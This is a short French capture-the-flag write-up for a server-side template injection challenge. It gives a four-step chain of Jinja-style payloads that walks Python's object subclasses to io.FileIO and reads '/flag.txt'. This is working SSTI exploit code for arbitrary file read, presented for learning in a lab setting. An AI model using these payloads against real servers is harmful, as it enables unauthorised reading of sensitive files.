# Injected

Auteur : [HappoSnake](https://github.com/pathibault/)

Briève description : 

Il a été découvert lors d'un test d'intrusion que le logiciel ci-dessous expose nos serveur a une vulnérabilité d'injection de template du côté serveur. (SSTI)

Pourriez-vous valider si c'est toujours le cas ?

(Le fichier 'flag.txt' se trouve à la racine, AKA '/flag.txt')

# Sources
- https://finctf.ettic.net/challenges#Injected-41

# Solution
## 1. Pour commencer affichons les sous-classes de la classe 'string'
```
{{''.__class__.__base__.__subclasses__()}}
```
résultat

<img src=./string.png>

<br/>

## 2. La classe '_io._IOBase', nous intéresse. Alors voir ses sous-classes

```
{{''.__class__.__base__.__subclasses__()[111].__subclasses__()}}
```

résultat

<img src=./IOBase.png>

<br/>

## 3. Continions avec la classe '_io._RawIOBase'
```
{{''.__class__.__base__.__subclasses__()[111].__subclasses__()[0].__subclasses__()}}
```

résultat

<img src=./RawIOBase.png>

<br/>

## 4. Finalement avec la classe 'io.FileIO' nous pouvons lire le fichier 'flag.txt'
```
{{''.__class__.__base__.__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]('/flag.txt').read()}}
```